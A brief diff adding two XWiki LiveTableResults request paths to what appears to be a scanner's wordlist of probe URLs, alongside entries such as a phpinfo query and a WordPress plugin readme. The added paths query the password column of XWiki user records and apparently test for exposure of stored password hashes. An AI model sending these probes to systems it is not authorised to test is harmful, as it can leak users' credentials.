@@ -221,3 +221,5 @@
 /server/specs/oas
 /?phpinfo=TRUE
 /wp-content/plugins/the-events-calendar/readme.txt
+/xwiki/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
+/bin/get/XWiki/LiveTableResults?outputSyntax=plain&password_class=XWiki.XWikiUsers&collist=password&password=hash:SHA-512:c
